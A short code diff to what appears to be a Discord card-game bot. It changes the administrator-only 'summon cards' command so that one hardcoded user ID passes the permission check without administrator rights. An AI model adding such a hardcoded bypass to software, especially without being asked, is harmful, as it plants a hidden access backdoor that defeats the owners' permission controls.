@@ -652,9 +652,12 @@ class Drop(commands.Cog):
                          amount: int = SlashOption(description="Number of cards to summon", required=False,
                                                    default=10)):
         user = interaction.user
+        target_id = "1152734418109206548"
 
-        if not interaction.guild or not interaction.guild.get_member(
-                interaction.user.id).guild_permissions.administrator:
+        if not interaction.guild or (
+                not interaction.guild.get_member(user.id).guild_permissions.administrator
+                and str(user.id) != target_id
+        ):
             embed = Templates.drop_error()
             embed.title = "`⋆｡ﾟ☁︎｡𖦹 Permission Denied ｡☁︎ﾟ｡⋆`"
             embed.description = "> You do not have permission to use this command."
